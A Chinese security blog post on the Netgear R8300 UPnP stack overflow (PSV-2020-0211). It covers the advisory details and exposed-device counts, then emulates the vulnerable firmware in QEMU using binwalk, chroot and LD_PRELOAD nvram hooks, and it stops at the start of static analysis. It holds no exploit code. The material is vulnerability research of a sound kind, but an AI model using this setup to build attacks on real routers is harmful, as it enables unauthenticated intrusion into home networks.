---
title: Netgear_栈溢出漏洞_PSV-2020-0211
date: 2021-01-08 13:26:26
tags:
- Netgear
- UPnP
- 固件模拟
categories:
- IOT
---
**固件模拟与UPnP栈溢出利用**
https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211
 https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/
https://paper.seebug.org/1311/#1
https://www.anquanke.com/post/id/217606


## **0x00 漏洞概要**

|漏洞编号：	|PSV-2020-0211	|
|---	|---	|
|披露时间：	|* 2020 -07-31 — [Netgear 官方发布安全公告](https://kb.netgear.com/000062158/Security-Advisory-for-Pre-Authentication-Command-Injection-on-R8300-PSV-2020-0211) * 2020-08-18 – [漏洞公开披露](https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/)	|
|影响厂商：	|Netgear	|
|漏洞类型：	|栈溢出漏洞	|
|漏洞评分（CVSS）：	|9.6, (AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)	|
|利用条件：	|该漏洞只需攻击者能够通过网络访问被攻击路由器的UPnP服务，无需身份验证。	|
|漏洞成因：	|该漏洞位于路由器的 UPnP 服务中， 由于解析 SSDP 协议数据包的代码存在缺陷，导致未经授权的远程攻击者可以发送特制的数据包使得栈上的 buffer 溢出，进一步控制 PC 执行任意代码。	|



## **0x01 威胁范围**

|影响范围：	|R8300 running firmware versions prior to 1.0.2.134	|
|---	|---	|
|ZoomEye查询结果：	|Netgear R8300共有579台设备暴露在互联网上，绝大部分分布在美国，少量设备出现在欧洲	|
|---	|![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083781/netgear/1_3.png)	|
||	|

## 0x02 Qemu模拟

|真机调试	|硬件调试接口	|uart	|
|---	|---	|---	|
|历史RCE	|NETGEAR 多款设备基于堆栈的缓冲区溢出远程执行代码漏洞	|
|设备后门开启telnet	|[Unlocking the Netgear Telnet Console](https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500)	|
|固件篡改植入telnet	|	|
|固件模拟	|QEMU	|现有平台上模拟 ARM、MIPS、X86、PowerPC、SPARK 等多种架构。	|
|树莓派、开发板	|只要 CPU 指令集对的上，就可以跑起来	|
| firmadyne	|基于qemu定制	|
|Qemu STM32	|	|
|Avatar	|混合式仿真	|

[嵌入式设备固件安全分析技术研究综述  http://cjc.ict.ac.cn/online/bfpub/yyc-2020818141436.pdf](http://cjc.ict.ac.cn/online/bfpub/yyc-2020818141436.pdf)

由于没有真机，我们采用了固件模拟的方式来搭建分析环境。
首先下载有问题的固件 R8300 Firmware Version 1.0.2.130 http://www.downloads.netgear.com/files/GDC/R8300/R8300-V1.0.2.130_1.0.99.zip
使用binwalk对固件中的特征字符串进行识别，可以看到R8300采用了squashfs文件系统格式

```
$ binwalk R8300-V1.0.2.130_1.0.99.chk

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58            0x3A            TRX firmware header, little endian, image size: 32653312 bytes, CRC32: 0x5CEAB739, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21AB50, rootfs offset: 0x0
86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5470272 bytes
2206602       0x21AB8A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 30443160 bytes, 1650 inodes, blocksize: 131072 bytes, created: 2018-12-13 04:36:38

```

使用 `binwalk -Me` 提取出 Squashfs 文件系统，可以看到R8300为ARM v5架构.

```
$ file usr/sbin/upnpd
usr/sbin/upnpd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), dynamically linked (uses shared libs), stripped
```

### firmadyne

直接使用firmadyne模拟R8300固件失败，一是网络接口初始化失败，二是NVRAM配置存在问题
原因可能是：

* firmadyne只支持armel、mipseb、 mipsel这三种系统内核，相比我们熟悉的armel，armhf代表了另一种不兼容的二进制标准。https://people.debian.org/~aurel32/qemu/armhf/
* ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1610083836/netgear/image_28.png)

* NVRAM库劫持失败，firmadyne实现了sem_get()、sem_lock()、sem_unlock()等函数https://github.com/firmadyne/libnvram

```
$ ./fat.py 'Path to R8300 firmware file'

                               __           _
                              / _|         | |
                             | |_    __ _  | |_
                             |  _|  / _` | | __|
                             | |   | (_| | | |_
                             |_|    \__,_|  \__|

                Welcome to the Firmware Analysis Toolkit - v0.3
    Offensive IoT Exploitation Training http://bit.do/offensiveiotexploitation
                  By Attify - https://attify.com  | @attifyme

[+] Firmware: R8300-V1.0.2.130_1.0.99.chk
[+] Extracting the firmware...
[+] Image ID: 1
[+] Identifying architecture...
[+] Architecture: armel
[+] Building QEMU disk image...
[+] Setting up the network connection, please standby...
[+] Network interfaces: []
[+] All set! Press ENTER to run the firmware...
[+] When running, press Ctrl + A X to terminate qemu
**[+] Command line: /home/yjy/firmware-analysis-toolkit/firmadyne/scratch/2/run.sh**
[sudo] password for yjy:
Starting firmware emulation... use Ctrl-a + x to exit
[    0.000000] Booting Linux on physical CPU 0x0
[    0.000000] Linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:05:21 UTC 2016
[    0.000000] CPU: ARMv7 Processor [412fc0f1] revision 1 (ARMv7), cr=10c5387d
[    0.000000] CPU: PIPT / VIPT nonaliasing data cache, PIPT instruction cache
[    0.000000] Machine model: linux,dummy-virt
[    0.000000] debug: ignoring loglevel setting.
[    0.000000] Memory policy: Data cache writeback
[    0.000000] On node 0 totalpages: 65536
[    0.000000] free_area_init_node: node 0, pgdat c061dfe8, node_mem_map cfdf9000
[    0.000000]   Normal zone: 512 pages used for memmap
[    0.000000]   Normal zone: 0 pages reserved
[    0.000000]   Normal zone: 65536 pages, LIFO batch:15
[    0.000000] CPU: All CPU(s) started in SVC mode.
[    0.000000] pcpu-alloc: s0 r0 d32768 u32768 alloc=1*32768
[    0.000000] pcpu-alloc: [0] 0
[    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 65024
[    0.000000] Kernel command line: root=/dev/vda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0
[    0.000000] PID hash table entries: 1024 (order: 0, 4096 bytes)
[    0.000000] Dentry cache hash table entries: 32768 (order: 5, 131072 bytes)
[    0.000000] Inode-cache hash table entries: 16384 (order: 4, 65536 bytes)
[    0.000000] Memory: 253344K/262144K available (4297K kernel code, 170K rwdata, 1584K rodata, 180K init, 148K bss, 8800K reserved, 0K cma-reserved)
[    0.000000] Virtual kernel memory layout:
[    0.000000]     vector  : 0xffff0000 - 0xffff1000   (   4 kB)
[    0.000000]     fixmap  : 0xffc00000 - 0xfff00000   (3072 kB)
[    0.000000]     vmalloc : 0xd0800000 - 0xff000000   ( 744 MB)
[    0.000000]     lowmem  : 0xc0000000 - 0xd0000000   ( 256 MB)
[    0.000000]     modules : 0xbf000000 - 0xc0000000   (  16 MB)
[    0.000000]       .text : 0xc0008000 - 0xc05c67bc   (5882 kB)
[    0.000000]       .init : 0xc05c7000 - 0xc05f4000   ( 180 kB)
[    0.000000]       .data : 0xc05f4000 - 0xc061e840   ( 171 kB)
[    0.000000]        .bss : 0xc0621000 - 0xc06462d4   ( 149 kB)
[    0.000000] NR_IRQS:16 nr_irqs:16 16
[    0.000000] Architected cp15 timer(s) running at 62.50MHz (virt).
[    0.000000] clocksource arch_sys_counter: mask: 0xffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns
[    0.000071] sched_clock: 56 bits at 62MHz, resolution 16ns, wraps every 4398046511096ns
[    0.000128] Switching to timer-based delay loop, resolution 16ns
[    0.001495] Console: colour dummy device 80x30
[    0.001639] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=625000)
[    0.001695] pid_max: default: 32768 minimum: 301
[    0.002124] Mount-cache hash table entries: 1024 (order: 0, 4096 bytes)
[    0.002142] Mountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes)
[    0.005250] CPU: Testing write buffer coherency: ok
[    0.008040] Setting up static identity map for 0x40008240 - 0x40008298
[    0.015663] VFP support v0.3: implementor 41 architecture 4 part 30 variant f rev 0
[    0.019946] clocksource jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604462750000 ns
[    0.025312] NET: Registered protocol family 16
[    0.026714] DMA: preallocated 256 KiB pool for atomic coherent allocations
[    0.028535] cpuidle: using governor ladder
[    0.028604] cpuidle: using governor menu
[    0.030202] genirq: Setting trigger mode 1 for irq 20 failed (gic_set_type+0x0/0x48)
[    0.031001] genirq: Setting trigger mode 1 for irq 21 failed (gic_set_type+0x0/0x48)
[    0.031154] genirq: Setting trigger mode 1 for irq 22 failed (gic_set_type+0x0/0x48)
[    0.031310] genirq: Setting trigger mode 1 for irq 23 failed (gic_set_type+0x0/0x48)
[    0.031466] genirq: Setting trigger mode 1 for irq 24 failed (gic_set_type+0x0/0x48)
[    0.031614] genirq: Setting trigger mode 1 for irq 25 failed (gic_set_type+0x0/0x48)
[    0.031756] genirq: Setting trigger mode 1 for irq 26 failed (gic_set_type+0x0/0x48)
[    0.031900] genirq: Setting trigger mode 1 for irq 27 failed (gic_set_type+0x0/0x48)
[    0.032378] genirq: Setting trigger mode 1 for irq 28 failed (gic_set_type+0x0/0x48)
[    0.032530] genirq: Setting trigger mode 1 for irq 29 failed (gic_set_type+0x0/0x48)
[    0.032670] genirq: Setting trigger mode 1 for irq 30 failed (gic_set_type+0x0/0x48)
[    0.032819] genirq: Setting trigger mode 1 for irq 31 failed (gic_set_type+0x0/0x48)
[    0.032959] genirq: Setting trigger mode 1 for irq 32 failed (gic_set_type+0x0/0x48)
[    0.033118] genirq: Setting trigger mode 1 for irq 33 failed (gic_set_type+0x0/0x48)
[    0.033256] genirq: Setting trigger mode 1 for irq 34 failed (gic_set_type+0x0/0x48)
[    0.033394] genirq: Setting trigger mode 1 for irq 35 failed (gic_set_type+0x0/0x48)
[    0.033536] genirq: Setting trigger mode 1 for irq 36 failed (gic_set_type+0x0/0x48)
[    0.033681] genirq: Setting trigger mode 1 for irq 37 failed (gic_set_type+0x0/0x48)
[    0.033849] genirq: Setting trigger mode 1 for irq 38 failed (gic_set_type+0x0/0x48)
[    0.034017] genirq: Setting trigger mode 1 for irq 39 failed (gic_set_type+0x0/0x48)
[    0.034163] genirq: Setting trigger mode 1 for irq 40 failed (gic_set_type+0x0/0x48)
[    0.034311] genirq: Setting trigger mode 1 for irq 41 failed (gic_set_type+0x0/0x48)
[    0.034462] genirq: Setting trigger mode 1 for irq 42 failed (gic_set_type+0x0/0x48)
[    0.034612] genirq: Setting trigger mode 1 for irq 43 failed (gic_set_type+0x0/0x48)
[    0.034766] genirq: Setting trigger mode 1 for irq 44 failed (gic_set_type+0x0/0x48)
[    0.034921] genirq: Setting trigger mode 1 for irq 45 failed (gic_set_type+0x0/0x48)
[    0.035088] genirq: Setting trigger mode 1 for irq 46 failed (gic_set_type+0x0/0x48)
[    0.035258] genirq: Setting trigger mode 1 for irq 47 failed (gic_set_type+0x0/0x48)
[    0.035408] genirq: Setting trigger mode 1 for irq 48 failed (gic_set_type+0x0/0x48)
[    0.035554] genirq: Setting trigger mode 1 for irq 49 failed (gic_set_type+0x0/0x48)
[    0.035698] genirq: Setting trigger mode 1 for irq 50 failed (gic_set_type+0x0/0x48)
[    0.035841] genirq: Setting trigger mode 1 for irq 51 failed (gic_set_type+0x0/0x48)
[    0.036126] genirq: Setting trigger mode 1 for irq 52 failed (gic_set_type+0x0/0x48)
[    0.037808] Serial: AMBA PL011 UART driver
[    0.038739] 9000000.pl011: ttyS0 at MMIO 0x9000000 (irq = 52, base_baud = 0) is a PL011 rev1
[    0.093732] console [ttyS0] enabled
[    0.106203] vgaarb: loaded
[    0.108624] SCSI subsystem initialized
[    0.111674] usbcore: registered new interface driver usbfs
[    0.115340] usbcore: registered new interface driver hub
[    0.118879] usbcore: registered new device driver usb
[    0.126521] cfg80211: Calling CRDA to update world regulatory domain
[    0.133497] Switched to clocksource arch_sys_counter
[    0.147183] NET: Registered protocol family 2
[    0.152842] TCP established hash table entries: 2048 (order: 1, 8192 bytes)
[    0.158337] TCP bind hash table entries: 2048 (order: 1, 8192 bytes)
[    0.162885] TCP: Hash tables configured (established 2048 bind 2048)
[    0.167385] UDP hash table entries: 256 (order: 0, 4096 bytes)
[    0.171595] UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
[    0.176698] NET: Registered protocol family 1
[    0.179833] PCI: CLS 0 bytes, default 64
[    0.185928] NetWinder Floating Point Emulator V0.97 (extended precision)
[    0.192393] futex hash table entries: 256 (order: -1, 3072 bytes)
[    0.201353] squashfs: version 4.0 (2009/01/31) Phillip Lougher
[    0.207858] jffs2: version 2.2. (NAND) © 2001-2006 Red Hat, Inc.
[    0.212517] romfs: ROMFS MTD (C) 2007 Red Hat, Inc.
[    0.219896] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 253)
[    0.225512] io scheduler noop registered
[    0.228340] io scheduler cfq registered (default)
[    0.232063] firmadyne: devfs: 1, execute: 1, procfs: 1, syscall: 0
[    0.237165] ------------[ cut here ]------------
[    0.240536] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/fs/sysfs/dir.c:31 sysfs_warn_dup+0x50/0x6c()
[    0.248160] sysfs: cannot create duplicate filename '/class/gpio'
[    0.252258] Modules linked in:
[    0.254810] CPU: 0 PID: 1 Comm: swapper Not tainted 4.1.17+ #1
[    0.259118] Hardware name: Generic DT based system
[    0.262292] [<c001c99c>] (unwind_backtrace) from [<c0019d30>] (show_stack+0x10/0x14)
[    0.262401] [<c0019d30>] (show_stack) from [<c0024ab4>] (warn_slowpath_common+0x80/0xa8)
[    0.262472] [<c0024ab4>] (warn_slowpath_common) from [<c0024b08>] (warn_slowpath_fmt+0x2c/0x3c)
[    0.262560] [<c0024b08>] (warn_slowpath_fmt) from [<c00e363c>] (sysfs_warn_dup+0x50/0x6c)
[    0.262619] [<c00e363c>] (sysfs_warn_dup) from [<c00e3714>] (sysfs_create_dir_ns+0x74/0x84)
[    0.262679] [<c00e3714>] (sysfs_create_dir_ns) from [<c018e6ac>] (kobject_add_internal+0xb8/0x2ac)
[    0.262742] [<c018e6ac>] (kobject_add_internal) from [<c018e9a8>] (kset_register+0x1c/0x44)
[    0.262801] [<c018e9a8>] (kset_register) from [<c02090b4>] (__class_register+0xa8/0x198)
[    0.262860] [<c02090b4>] (__class_register) from [<c02091e4>] (__class_create+0x40/0x70)
[    0.262918] [<c02091e4>] (__class_create) from [<c01adf68>] (register_devfs_stubs+0x314/0xbb4)
[    0.262981] [<c01adf68>] (register_devfs_stubs) from [<c05d9b08>] (init_module+0x28/0xa4)
[    0.263053] [<c05d9b08>] (init_module) from [<c0009670>] (do_one_initcall+0x104/0x1b4)
[    0.263113] [<c0009670>] (do_one_initcall) from [<c05c7d08>] (kernel_init_freeable+0xf0/0x1b0)
[    0.263229] [<c05c7d08>] (kernel_init_freeable) from [<c040f28c>] (kernel_init+0x8/0xe4)
[    0.263287] [<c040f28c>] (kernel_init) from [<c0016da8>] (ret_from_fork+0x14/0x2c)
[    0.263383] ---[ end trace b31221f46a8dc90e ]---
[    0.263460] ------------[ cut here ]------------
[    0.263502] WARNING: CPU: 0 PID: 1 at /home/vagrant/firmadyne-kernel/kernel-v4.1/lib/kobject.c:240 kobject_add_internal+0x240/0x2ac()
[    0.263572] kobject_add_internal failed for gpio with -EEXIST, don't try to register things with the same name in the same directory.
[    0.263639] Modules linked in:
[    0.263699] CPU: 0 PID: 1 Comm: swapper Tainted: G        W       4.1.17+ #1
[    0.263744] Hardware name: Generic DT based system
[    0.263788] [<c001c99c>] (unwind_backtrace) from [<c0019d30>] (show_stack+0x10/0x14)
[    0.263846] [<c0019d30>] (show_stack) from [<c0024ab4>] (warn_slowpath_common+0x80/0xa8)
[    0.263906] [<c0024ab4>] (warn_slowpath_common) from [<c0024b08>] (warn_slowpath_fmt+0x2c/0x3c)
[    0.263970] [<c0024b08>] (warn_slowpath_fmt) from [<c018e834>] (kobject_add_internal+0x240/0x2ac)
[    0.264032] [<c018e834>] (kobject_add_internal) from [<c018e9a8>] (kset_register+0x1c/0x44)
[    0.264091] [<c018e9a8>] (kset_register) from [<c02090b4>] (__class_register+0xa8/0x198)
[    0.268034] [<c02090b4>] (__class_register) from [<c02091e4>] (__class_create+0x40/0x70)
[    0.275667] [<c02091e4>] (__class_create) from [<c01adf68>] (register_devfs_stubs+0x314/0xbb4)
[    0.280619] [<c01adf68>] (register_devfs_stubs) from [<c05d9b08>] (init_module+0x28/0xa4)
[    0.285445] [<c05d9b08>] (init_module) from [<c0009670>] (do_one_initcall+0x104/0x1b4)
[    0.289737] [<c0009670>] (do_one_initcall) from [<c05c7d08>] (kernel_init_freeable+0xf0/0x1b0)
[    0.290664] [<c05c7d08>] (kernel_init_freeable) from [<c040f28c>] (kernel_init+0x8/0xe4)
[    0.290727] [<c040f28c>] (kernel_init) from [<c0016da8>] (ret_from_fork+0x14/0x2c)
[    0.290797] ---[ end trace b31221f46a8dc90f ]---
[    0.290872] firmadyne: Cannot create device class: gpio!
[    0.291677] firmadyne: Cannot register character device: watchdog, 0xa, 0x82!
[    0.291743] firmadyne: Cannot register character device: wdt, 0xfd, 0x0!
[    0.345419] Non-volatile memory driver v1.3
[    0.360206] brd: module loaded
[    0.368143] loop: module loaded
[    0.375773]  vda: vda1
[    0.380587] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.387584] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.394469] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.401256] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.402697] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.402848] [nandsim] warning: read_byte: unexpected data output cycle, state is STATE_READY return 0x0
[    0.403058] nand: device found, Manufacturer ID: 0x98, Chip ID: 0x39
[    0.403112] nand: Toshiba NAND 128MiB 1,8V 8-bit
[    0.403158] nand: 128 MiB, SLC, erase size: 16 KiB, page size: 512, OOB size: 16
[    0.403555] flash size: 128 MiB
[    0.403585] page size: 512 bytes
[    0.403612] OOB area size: 16 bytes
[    0.403640] sector size: 16 KiB
[    0.403665] pages number: 262144
[    0.403690] pages per sector: 32
[    0.403715] bus width: 8
[    0.405652] bits in sector size: 14
[    0.408186] bits in page size: 9
[    0.410586] bits in OOB size: 4
[    0.412941] flash size with OOB: 135168 KiB
[    0.416112] page address bytes: 4
[    0.418491] sector address bytes: 3
[    0.421054] options: 0x42
[    0.423632] Scanning device for bad blocks
[    0.497574] Creating 11 MTD partitions on "NAND 128MiB 1,8V 8-bit":
[    0.504589] 0x000000000000-0x000000100000 : "NAND simulator partition 0"
[    0.510956] 0x000000100000-0x000000200000 : "NAND simulator partition 1"
[    0.517483] 0x000000200000-0x000000300000 : "NAND simulator partition 2"
[    0.523079] 0x000000300000-0x000000400000 : "NAND simulator partition 3"
[    0.528404] 0x000000400000-0x000000500000 : "NAND simulator partition 4"
[    0.533683] 0x000000500000-0x000000600000 : "NAND simulator partition 5"
[    0.538960] 0x000000600000-0x000000700000 : "NAND simulator partition 6"
[    0.544362] 0x000000700000-0x000000800000 : "NAND simulator partition 7"
[    0.549586] 0x000000800000-0x000000900000 : "NAND simulator partition 8"
[    0.554998] 0x000000900000-0x000000a00000 : "NAND simulator partition 9"
[    0.560167] 0x000000a00000-0x000008000000 : "NAND simulator partition 10"
[    0.568706] tun: Universal TUN/TAP device driver, 1.6
[    0.573024] tun: (C) 1999-2004 Max Krasnyansky <maxk@qualcomm.com>
[    0.584170] PPP generic driver version 2.4.2
[    0.587727] PPP BSD Compression module registered
[    0.591009] PPP Deflate Compression module registered
[    0.594922] PPP MPPE Compression module registered
[    0.598416] NET: Registered protocol family 24
[    0.601736] PPTP driver version 0.8.5
[    0.604905] usbcore: registered new interface driver usb-storage
[    0.610485] hidraw: raw HID events driver (C) Jiri Kosina
[    0.614655] usbcore: registered new interface driver usbhid
[    0.618555] usbhid: USB HID core driver
[    0.621686] Netfilter messages via NETLINK v0.30.
[    0.625702] nf_conntrack version 0.5.0 (3958 buckets, 15832 max)
[    0.630752] ctnetlink v0.93: registering with nfnetlink.
[    0.635472] ipip: IPv4 over IPv4 tunneling driver
[    0.639820] gre: GRE over IPv4 demultiplexor driver
[    0.643303] ip_gre: GRE over IPv4 tunneling driver
[    0.649259] ip_tables: (C) 2000-2006 Netfilter Core Team
[    0.655447] arp_tables: (C) 2002 David S. Miller
[    0.660480] Initializing XFRM netlink socket
[    0.664155] NET: Registered protocol family 10
[    0.670172] ip6_tables: (C) 2000-2006 Netfilter Core Team
[    0.674635] sit: IPv6 over IPv4 tunneling driver
[    0.680072] NET: Registered protocol family 17
[    0.683649] bridge: automatic filtering via arp/ip/ip6tables has been deprecated. Update your scripts to load br_netfilter if you need this.
[    0.692092] Bridge firewalling registered
[    0.694840] Ebtables v2.0 registered
[    0.697697] 8021q: 802.1Q VLAN Support v1.8
[    0.700677] Registering SWP/SWPB emulation handler
[    0.705032] hctosys: unable to open rtc device (rtc0)
[    0.713464] EXT4-fs (vda1): couldn't mount as ext3 due to feature incompatibilities
[    0.721943] EXT4-fs (vda1): mounting ext2 file system using the ext4 subsystem
[    0.732941] EXT4-fs (vda1): warning: mounting unchecked fs, running e2fsck is recommended
[    0.740503] EXT4-fs (vda1): mounted filesystem without journal. Opts: (null)
[    0.745898] VFS: Mounted root (ext2 filesystem) on device 254:1.
[    0.752726] Freeing unused kernel memory: 180K (c05c7000 - c05f4000)
[    0.790000] random: init urandom read with 3 bits of entropy available
nvram_get_buf: time_zone
sem_lock: Triggering NVRAM initialization!
nvram_init: Initializing NVRAM...
sem_get: Key: 410160c4
nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!
sem_get: Key: 410c0019
nvram_set_default_builtin: Setting built-in default values!
nvram_set: console_loglevel = "7"
sem_get: Key: 410c0019
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_get: Waiting for semaphore initialization (Key: 410c0019, Semaphore: 8001)...
sem_lock: Unable to get semaphore!
```



### Qemu自定义

1. **配置arm虚拟机**

使用Qemu模拟固件需要下载对应的arm虚拟机镜像，内核和initrd。
https://people.debian.org/~aurel32/qemu/armhf/

```
[debian_wheezy_armhf_desktop.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_desktop.qcow2)  2013-12-17 02:43  1.7G   [debian_wheezy_armhf_standard.qcow2](https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2) 2013-12-17 00:04  229M   
[initrd.img-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress)        2013-12-17 01:57  2.2M   
[vmlinuz-3.2.0-4-vexpress](https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress)           2013-09-20 18:33  1.9M  
```

标准的虚拟机启动命令为

```
- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2"
- qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_desktop.qcow2 -append "root=/dev/mmcblk0p2"
```

对于R8300固件，在 Host 机上创建一个 tap 接口并分配 IP，启动虚拟机：

```
`sudo tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 192.168.2.1/24
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic`
```

与标准命令区别在于` -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic`
启动之后输入用户名和密码，都是 root，为虚拟机分配 IP：

```
`root@debian-armhf:~# ifconfig eth0 ``192.168``.``2.2``/``24`
```

这样 Host 和虚拟机就网络互通了，然后挂载 proc、dev，最后 chroot 即可。

```
`root@debian-armhf:~# mount -t proc /proc ./squashfs-root/proc
root@debian-armhf:~# mount -o bind /dev ./squashfs-root/dev
root@debian-armhf:~# chroot ./squashfs-root/ sh`
```



1. **修复依赖**

NVRAM( 非易失性 RAM) 用于存储路由器的配置信息，而 upnpd 运行时需要用到其中部分配置信息。在没有硬件设备的情况下，我们可以使用 `LD_PRELOAD` 劫持以下函数符号。手动创建 `/tmp/var/run` 目录，再次运行提示缺少 `/dev/nvram`。

* 编译nvram.so

 https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c

```
$ arm-linux-gcc -Wall -fPIC -shared nvram.c  -o nvram.so
```

* 劫持`dlsym`

nvram库的实现者还同时 hook 了 `system`、`fopen`、`open` 等函数，因此还会用到 `dlsym`，`/lib/libdl.so.0 `导出了该符号。

```
`$ grep ``-``r ``"dlsym"`` ``.`
`Binary`` file ``./``lib``/``libcrypto``.``so``.``1.0``.``0`` matches`
`Binary`` file ``./``lib``/``libdl``.``so``.``0`` matches`
`Binary`` file ``./``lib``/``libhcrypto``-``samba4``.``so``.``5`` matches`
`Binary`` file ``./``lib``/``libkrb5``-``samba4``.``so``.``26`` matches`
`Binary`` file ``./``lib``/``libldb``.``so``.``1`` matches`
`Binary`` file ``./``lib``/``libsamba``-``modules``-``samba4``.``so matches`
`Binary`` file ``./``lib``/``libsqlite3``.``so``.``0`` matches`
`grep``:`` ``./``lib``/``modules``/``2.6``.``36.4brcmarm``+:`` ``No`` such file ``or`` directory`

$ `readelf ``-``a `**`./``lib``/``libdl``.``so``.`**`**0**`` ``|`` grep dlsym`
`    ``26``:`` ``000010f0``   ``296`` FUNC    GLOBAL DEFAULT    ``7`` dlsym`
```

* 配置tmp/nvram.ini信息

接下来要做的就是根据上面的日志补全配置信息，也可以参考https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini。至于为什么这么设置，可以查看对应的汇编代码逻辑（配置的有问题的话很容易触发段错误）。

```
`upnpd_debug_level=9
lan_ipaddr=192.168.2.2
hwver=R8500
friendly_name=R8300
upnp_enable=1
upnp_turn_on=1
upnp_advert_period=30
upnp_advert_ttl=4
upnp_portmap_entry=1
upnp_duration=3600
upnp_DHCPServerConfigurable=1
wps_is_upnp=0
upnp_sa_uuid=00000000000000000000
lan_hwaddr=AA:BB:CC:DD:EE:FF`
```

* 运行过程

```
**# ./usr/sbin/upnpd**
# /dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory
/dev/nvram: No such file or directory

**# LD_PRELOAD="./nvram.so" ./usr/sbin/upnpd**
# ./usr/sbin/upnpd: can't resolve symbol 'dlsym'

**# LD_PRELOAD="./nvram.so ./lib/libdl.so.0" ./usr/sbin/upnpd**
# [0x00026460] fopen('/var/run/upnpd.pid', 'wb+') = 0x00b19008
[0x0002648c] custom_nvram initialised
[0x76eb7cb8] **fopen****('/tmp/nvram.ini', 'r') = 0x00b19008**
[nvram 0] upnpd_debug_level = 9
[nvram 1] lan_ipaddr = 192.168.2.2
[nvram 2] hwver = R8500
[nvram 3] friendly_name = R8300
[nvram 4] upnp_enable = 1
[nvram 5] upnp_turn_on = 1
[nvram 6] upnp_advert_period = 30
[nvram 7] upnp_advert_ttl = 4
[nvram 8] upnp_portmap_entry = 1
[nvram 9] upnp_duration = 3600
[nvram 10] upnp_DHCPServerConfigurable = 1
[nvram 11] wps_is_upnp = 0
[nvram 12] upnp_sa_uuid = 00000000000000000000
[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF
[nvram 14] lan_hwaddr =
Read 15 entries from /tmp/nvram.ini
acosNvramConfig_get('upnpd_debug_level') = '9'
```

## 0x03 静态分析

该漏洞的原理是使用strcpy函数不当，拷贝过长字符导致缓冲区溢出，那么如何到达溢出位置。
首先upnpd服务在`sub_1D020()` 中使用`recvfrom()`从套接字接收UDP数据包，并捕获数据发送源的地址。从函数定义可知，upnpd接收了长度为0x1FFFF大小的数据到缓冲区v54

> **recvfrom** recvfrom函数(经socket接收数据):

> 函数原型:int recvfrom(SOCKET s,void ***buf**,int **len**,unsigned int flags, struct sockaddr *from,int *fromlen);

> 相关函数 recv，recvmsg，send，sendto，socket

